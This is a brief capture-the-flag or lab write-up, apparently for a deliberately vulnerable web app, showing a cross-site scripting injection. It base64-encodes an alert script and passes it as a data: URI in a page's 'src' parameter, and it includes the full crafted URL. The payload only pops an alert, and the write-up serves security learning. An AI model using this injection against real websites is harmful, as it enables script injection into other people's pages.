By inspecting the source code of the front page we can see that there is a
<a href="?page=media&src=nsa">
meaning that the page 'media' accepts 'src' filter to which we can pass our
script, though not directly, but in an encoded way.

First, encode <script>alert('Yay')</script> or any other script with base64 like so:
    base64 <<< "<script>alert('Yay')</script>"

Then, pass it to 'src' filter
http://<ip_address>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWWF5Jyk8L3NjcmlwdD4K
